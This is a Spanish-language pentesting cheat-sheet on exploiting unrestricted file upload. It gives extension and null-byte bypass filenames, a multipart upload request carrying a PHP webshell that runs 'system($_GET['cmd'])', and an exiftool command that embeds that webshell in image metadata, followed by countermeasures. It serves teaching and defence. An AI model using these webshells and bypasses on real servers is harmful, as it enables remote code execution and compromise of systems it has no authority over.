---
title: File Upload Exploitation
slug: explotacion-fileupload
aliases: [File Upload Vulnerability, Unrestricted File Upload, Webshell upload]
fase: [Explotación]
plataforma: Web
dificultad: Intermedia
mitre: [T1190]
related: [web-shells, analisis-lfi-rfi]
learning_refs: [portswigger/file-upload-rce-via-web-shell-upload]
---

# File Upload Exploitation

## Descripción
Técnica que aprovecha la falta de validación en las funcionalidades de carga de archivos de una aplicación web. Permite a un atacante subir archivos maliciosos (como webshells) para ejecutar código en el servidor, realizar defacement o escalar privilegios.

## Herramientas
- **Burp Suite** (Proxy, Repeater) — esencial para interceptar y modificar el Content-Type y la extensión del archivo.
- **Webshells** (`php-reverse-shell.php`, `cmd.jsp`) — scripts diseñados para proporcionar una interfaz de comandos tras la subida exitosa.
- **Exiftool** — para inyectar metadatos maliciosos en archivos de imagen legítimos.

## Comandos / Ejemplos

### Bypass de extensión mediante Null Byte o Extensiones Dobles
```bash
# Intento de bypass con doble extensión
mv shell.php shell.jpg.php

# Bypass con caracteres nulos (dependiente de la versión del lenguaje)
shell.php%00.jpg
```

### Bypass de Content-Type en Burp Suite
```http
POST /upload.php HTTP/1.1
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

### Inyección de código en metadatos de imagen
```bash
# Insertar código PHP en el campo de comentarios de una imagen
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg
```

## Contramedidas
- Validar la extensión del archivo contra una lista blanca estricta.
- Verificar el contenido real del archivo (Magic Bytes) no solo la extensión o Content-Type.
- Renombrar los archivos subidos a nombres aleatorios y almacenarlos fuera del document root.
- Deshabilitar la ejecución de scripts en los directorios de carga (ej. `.htaccess` con `php_flag engine off`).

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
